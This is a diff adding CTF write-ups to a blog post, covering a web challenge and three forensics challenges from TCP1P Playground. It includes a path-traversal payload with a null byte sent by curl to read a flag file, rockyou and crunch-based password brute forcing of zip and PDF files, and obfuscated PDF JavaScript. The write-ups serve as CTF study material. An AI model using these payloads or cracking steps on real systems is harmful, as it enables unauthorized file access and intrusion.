@@ -1,5 +1,5 @@
 ---
-title: "TCP1P Playground 2024"
+title: "TCP1P Playground 365"
 date: "2025-02-19"
 description: "Reverse Engineering, Web Exploitation, Forensic, Blockchain Walktrough"
 categories: [
@@ -15,7 +15,7 @@ TCP1P is an Indonesian CTF team actively engaging in competitive cybersecurity e
 
 ![](ra.png)
 
-This event CTF has very long time (1 Year(its not even finish yet)), so i kinda confused to write the right year on the title (lol), so this CTF has so many categories, and my overall solved is on Forensic, Web Exploitation, Binary Exploitation, Reverse Engineering, and Blockchain.
+This event CTF has very long time (1 Year(its not even finish yet)), so i kinda confused to write the right year on the title (lol) (update: nah, ill just name it 365 then), so this CTF has so many categories, and my overall solved is on Forensic, Web Exploitation, Binary Exploitation, Reverse Engineering, and Blockchain.
 
 So maybe i'll post 1 category/day or smth, depends on my mood
 ## Reverse Engineering
@@ -488,4 +488,231 @@ Flag: TCP1P{p53uDO_RANDOM_IS_NOt_R4ndOM_at_A11}
 ```
 Flag: ``TCP1P{p53uDO_RANDOM_IS_NOt_R4ndOM_at_A11}``
 
-## LANJUT BESOK WAK NGANTUK
+## Web Exploitation
+### Note FS
+##### Author: dimas
+##### Desc: Note FS challenge? what does it mean? I don't know, you should figure it out by yourself.
+so we got a web service and the source code, and this is the ``index.ts``
+```ts
+import express from 'express'
+import { readdirSync, statSync,  writeFileSync, readFileSync } from 'fs'
+import { join } from 'path'
+
+const app = express()
+const PORT = 3000
+
+app.get('/', (req, res) => {
+  const script = `<script>
+    fetch('/api/files')
+      .then(res => res.json())
+      .then(files => {
+        const list = document.createElement('ul')
+        files.forEach(file => {
+          const item = document.createElement('li')
+          item.textContent = file
+          item.addEventListener('click', () => {
+            fetch('/api/files/' + file)
+              .then(res => res.text())
+              .then(text => {
+                document.getElementById('content').textContent = text
+              })
+          })
+          list.appendChild(item)
+        })
+        document.body.appendChild(list)
+      })
+    </script>`
+
+    const body = `<div id="content"></div>`
+    const createForm = `<form action="/api/files" method="POST">
+    <input type="text" name="filename" />
+    <textarea name="content"></textarea>
+    <button type="submit">Create</button>
+    </form>`
+    const style = `<style>
+    body {
+      font-family: Arial, sans-serif;
+    }
+    form {
+      margin-top: 1rem;
+    }
+    textarea {
+      width: 100%;
+      height: 10rem;
+    }
+    ul {
+      list-style: none;
+      padding: 0;
+    }
+    </style>`
+    res.send(style + body + createForm + script)
+})
+
+app.get('/api/files', (req, res) => {
+  const files = readdirSync(join(__dirname, 'files'))
+    .filter((file) => statSync(join(__dirname, 'files', file)).isFile())
+    .map((file) => file.replace('.txt', ''))
+  res.json(files)
+})
+
+app.get('/api/files/:filename', (req, res) => {
+    let { filename } = req.params
+    const content = readFileSync(join(__dirname, 'files', filename + ".txt"),)
+    res.send(content)
+})
+
+app.post('/api/files', express.urlencoded({ extended: true }), (req, res) => {
+  const { filename, content } = req.body
+  writeFileSync(join(__dirname, 'files', filename + ".txt"), content)
+  res.redirect('/')
+})
+
+app.listen(PORT, () => {
+  console.log(`Server is running at http://localhost:${PORT}`)
+})
+```
+based on the source, we got path traversal fuln by endpoint ``/api/files:filename:``
+```ts
+app.get('/api/files/:filename', (req, res) => {
+    let { filename } = req.params
+    const content = readFileSync(join(__dirname, 'files', filename + ".txt"),)
+    res.send(content)
+})
+```
+and also i got this in the docker file
+```dockerfile
+# Use the official Bun image as a base
+FROM oven/bun:1.1.43
+
+# Create and set the working directory
+WORKDIR /app
+
+# Copy the package.json and install dependencies
+COPY package.json bun.lockb /app/
+RUN bun install
+
+COPY ./flag.txt /flag.flag
+
+# Copy the rest of the application files
+COPY . /app
+
+# Expose the port the app runs on
+EXPOSE 3000
+
+# Command to run the application
+CMD ["bun", "start"]
+```
+they saved the flag in flag.flag
+```Dockerfile
+COPY ./flag.txt /flag.flag
+```
+but (in index.ts, it has this)
+```ts
+app.get('/api/files/:filename', (req, res) => {
+    let { filename } = req.params
+    const content = readFileSync(join(__dirname, 'files', filename + ".txt"),)
+    res.send(content)
+})
+
+app.post('/api/files', express.urlencoded({ extended: true }), (req, res) => {
+  const { filename, content } = req.body
+  writeFileSync(join(__dirname, 'files', filename + ".txt"), content)
+  res.redirect('/')
+})
+```
+it means the system will read all file in directory files with adding .txt, so we cannot input to get the flag like this
+```
+/api/files/../../../../flag.flag
+```
+cus the system will read the path like this:
+```
+/api/files/../../../../flag.flag.txt
+```
+we can bypass the .txt by using null byte injection and set the payload as url encoding (based in this source)
+```ts
+app.post('/api/files', express.urlencoded({ extended: true }), (req, res) => {
+  const { filename, content } = req.body
+  writeFileSync(join(__dirname, 'files', filename + ".txt"), content)
+  res.redirect('/')
+})
+```
+#### Solver
+```bash
+❯ curl http://playground.tcp1p.team:4823/api/files/..%2f..%2fflag.flag%00
+TCP1P{path_traversal_using_nullbyte_is_still_happend_in_bun_haha}
+```
+Flag: ``TCP1P{path_traversal_using_nullbyte_is_still_happend_in_bun_haha}``
+#### make a webex walktrough is make me lazy ngl, ill post again about webex tomorrow ig, lets switch to forensic
+## Digital Forensic
+#### Audio Images
+###### Author: Orch4th
+###### Desc: Budi is a vocational school student and a famous hacker in his class and has the mindset that things that exist in the real world can actually also be created in the digital world. Therefore, Budi tried to make a digital dinosaur called Cracknosaurus in the hope that the digital dinosaur he made could rule the world like the ancient dinosaurs of ancient times. Cracknosaurus may look like an ordinary file, but you wouldn't know what Budi is hiding in this really extraordinary cracknosaurus image.
+We got a zip file, but when i want to unzip it, it says `unsupported compression method 99` means its locked, and i try to brute force the password with rockyou
+![](cracknosaurushash.png)
+and we got the pass, unlock it with 7z
+and we got an image
+![](cracknosaurusimg.png)
+
+then i try to brute force again, but with stegseek (same but faster than john)
+![](cracknosaurusflag.png)
+Flag: `TCP1P{m4st3r1ng_cr4ck1ng_w1th_r0cky0u!!!}`
+
+#### kuli-ah forensik
+##### Author: fire
+##### Desc: I just created secret message in image file but i want to make it secure so i transform it to audio file. But i think it's not secure enough so i archive it with password. I encrypt it with very strong password. I'am sure no one can crack it because my password is random 15 digit number in base 3. It's very very secure right? ... right??. Then i wrap my file within an image so no one can realize. flag = TCF2024{<my secret message>}
+we got a image, as  you can see in the desc, it says the image i have `strong` pass, the pass is 15 random digit number in base 3, but you know... its not secure as u thought, we can brute force it, but before brute force it, we need to make the wordlist
+```bash
+crunch 15 15 012 -o wordlist.txt
+```
+we got the wordlist, and also i got zip after foremost'ed the img, maybe we need to brute force on the zip, cus it is says unsupported method tho
+![](kuliahhash.png)
+we got the pass, after unlock the zip, i got Robot36.wav, and yea its audio steganography, we can use sstv decoder to decode the audio and set the output as image
+![](kuliahsstv.png)
+open the image
+![](kuliahflag.png)
+Flag: `TCF2024{w0w_congrats_you_win}`
+
+#### pemanasan
+##### About: fire
+##### Desc: I just create handmade pdf. Well i also made flag checker inside pdf file. Cool right? 😎
+we got a pdf, when i tried to open it, it has a pass, ye ofc i brute force it with rockyou first
+![](pemanasanbf.png)
+
+the pass is `makanapel` when it unlock and opened it, the flag is not in the page
+![](pemanasanpdf.png)
+
+the only one hint is `flag checker`, means the flag is in the file, then i use `qpdf` to unlock the original pdf (without any encryption, pure)
+
+```bash
+qpdf --password=makanapel --decrypt flag_protected.pdf out.pdf
+```
+then use binwalk to extract it
+![](pemanasanbinwalk.png)
+and i open file `185` and it contains `JSFuck`, lets just decode it
+```c
+function _0x428e(_0x360b81,_0x4a2ffb){var _0x3c8831=_0x3c88();return _0x428e=function(_0x428efe,_0x7daa05){_0x428efe=_0x428efe-0x7c;var _0x2e01cc=_0x3c8831[_0x428efe];return _0x2e01cc;},_0x428e(_0x360b81,_0x4a2ffb);}function _0x3c88(){var _0x178bae=['fromCharCode','20Hwhitf','30056ZjFZBz','\x20maaf\x20:\x27(\x20','PDF\x20flag\x20checker','Flagnya\x20bukan\x20','5382816jhtpfI','281897FolUNl','140ShvdyB','455255GhoyCL','88838DGlfJz','24GHOAkc','Default\x20Value','6599460WCuEUC','1035078Zktymj','alert','Enter\x20the\x20flag\x20:\x20','Yey\x20kamu\x20dapet\x20flag:\x20','1377LNLJUD'];_0x3c88=function(){return _0x178bae;};return _0x3c88();}var _0x24eee0=_0x428e;(function(_0x1a4708,_0x1dac44){var _0x5997a0=_0x428e,_0x64a36e=_0x1a4708();while(!![]){try{var _0x3ae7c2=-parseInt(_0x5997a0(0x88))/0x1*(-parseInt(_0x5997a0(0x7e))/0x2)+parseInt(_0x5997a0(0x82))/0x3+-parseInt(_0x5997a0(0x7f))/0x4*(-parseInt(_0x5997a0(0x7d))/0x5)+-parseInt(_0x5997a0(0x8d))/0x6+-parseInt(_0x5997a0(0x81))/0x7+-parseInt(_0x5997a0(0x89))/0x8*(-parseInt(_0x5997a0(0x86))/0x9)+-parseInt(_0x5997a0(0x7c))/0xa*(-parseInt(_0x5997a0(0x8e))/0xb);if(_0x3ae7c2===_0x1dac44)break;else _0x64a36e['push'](_0x64a36e['shift']());}catch(_0xce2ac){_0x64a36e['push'](_0x64a36e['shift']());}}}(_0x3c88,0xd53b3),app[_0x24eee0(0x83)](_0x24eee0(0x8b)));var userInput=app['response'](_0x24eee0(0x84),_0x24eee0(0x80)),flag=String[_0x24eee0(0x87)](0x4f^0x1b,0x1e^0x5d,0x33^0x75,0x8d^0xbf,0x92^0xa2,0x4d^0x7f,0x21^0x15,0xb8^0xc3,0xef^0x82,0x69^0x8,0xcb^0xa7,0x8f^0xe3,0x34^0x5d,0x1b^0x78,0xc4^0xf5,0xb1^0xde,0xa6^0xd3,0x2^0x71,0xc6^0x99,0xda^0xaa,0x4c^0x28,0xfb^0x9d,0x91^0xce,0xb5^0xdc,0xe5^0x96,0xd8^0x87,0x5a^0x39,0x7d^0xf,0x88^0xbc,0x1a^0x60,0x4f^0x36,0x1e^0x67,0xf7^0xa8,0x8f^0xea,0x1b^0x2a,0xa^0x3c,0x99^0xa0,0xdc^0xe9,0xe2^0x84,0xd4^0xe4,0xe7^0xdf,0x61^0x54,0x26^0x40,0x99^0xa9,0xa3^0x95,0xf7^0xce,0xd9^0xbf,0x2d^0x4f,0xd1^0xe0,0x9f^0xfa,0x6a^0x8,0x44^0x26,0xed^0xdf,0x6a^0xe,0x44^0x7d,0x96^0xf2,0xea^0x8c,0x34^0x5,0xe0^0x84,0xd0^0xe0,0xd0^0xe1,0x5c^0x6f,0xb^0x6e,0xd1^0xb2,0xa8^0xca,0x1d^0x60);userInput==flag?app['alert'](_0x24eee0(0x85)+flag):app[_0x24eee0(0x83)](_0x24eee0(0x8c)+userInput+_0x24eee0(0x8a));
+```
+and yea the code is contains XOR encryption, and this is the solver
+```py
+def decrypt_flag():
+    encrypted_values = [
+        0x4f^0x1b, 0x1e^0x5d, 0x33^0x75, 0x8d^0xbf, 0x92^0xa2, 0x4d^0x7f, 
+        0x21^0x15, 0xb8^0xc3, 0xef^0x82, 0x69^0x8, 0xcb^0xa7, 0x8f^0xe3, 
+        0x34^0x5d, 0x1b^0x78, 0xc4^0xf5, 0xb1^0xde, 0xa6^0xd3, 0x2^0x71, 
+        0xc6^0x99, 0xda^0xaa, 0x4c^0x28, 0xfb^0x9d, 0x91^0xce, 0xb5^0xdc, 
+        0xe5^0x96, 0xd8^0x87, 0x5a^0x39, 0x7d^0xf, 0x88^0xbc, 0x1a^0x60, 
+        0x4f^0x36, 0x1e^0x67, 0xf7^0xa8, 0x8f^0xea, 0x1b^0x2a, 0xa^0x3c, 
+        0x99^0xa0, 0xdc^0xe9, 0xe2^0x84, 0xd4^0xe4, 0xe7^0xdf, 0x61^0x54, 
+        0x26^0x40, 0x99^0xa9, 0xa3^0x95, 0xf7^0xce, 0xd9^0xbf, 0x2d^0x4f, 
+        0xd1^0xe0, 0x9f^0xfa, 0x6a^0x8, 0x44^0x26, 0xed^0xdf, 0x6a^0xe, 
+        0x44^0x7d, 0x96^0xf2, 0xea^0x8c, 0x34^0x5, 0xe0^0x84, 0xd0^0xe0, 
+        0xd0^0xe1, 0x5c^0x6f, 0xb^0x6e, 0xd1^0xb2, 0xa8^0xca, 0x1d^0x60
+    ]
+    
+    flag = ''.join(chr(c) for c in encrypted_values)
+    return flag
+
+print("Flag:", decrypt_flag())
+```
+Flag: `TCF2024{mallic1ous_pdf_is_cr4zyy_e1695f085f069fb1ebb2d9df1d013ecb}`
+## LANJUT BESOK NGANTUK
